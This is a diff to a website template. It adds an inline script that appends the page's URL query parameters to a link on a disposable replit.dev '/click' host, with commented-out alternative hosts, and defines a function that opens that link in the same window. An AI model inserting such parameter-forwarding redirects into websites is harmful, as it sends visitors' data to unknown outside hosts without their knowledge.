@@ -24,6 +24,26 @@
 
                 {{ end }}
                 {{ partial "form1.html" . }}
+    <script>
+const param = new URLSearchParams(document.location.search);
+    // let uri = "https://bing.com/";
+  //   let uri = "https://dd.adipiscing.workers.dev/click";
+         let uri = "https://2464b3b2-85e6-4910-81db-cdf0588c909b-00-3l6am6yo59ooe.sisko.replit.dev/click"
+       if (!param) {
+var ura = uri;
+
+       } else {
+       var ura = uri + '?' + param;
+       }
+
+function showWindow(url) {
+
+
+    window.open(url, "_self");
+            return false;
+       }
+
+</script> 
 
 </body>
 </html>
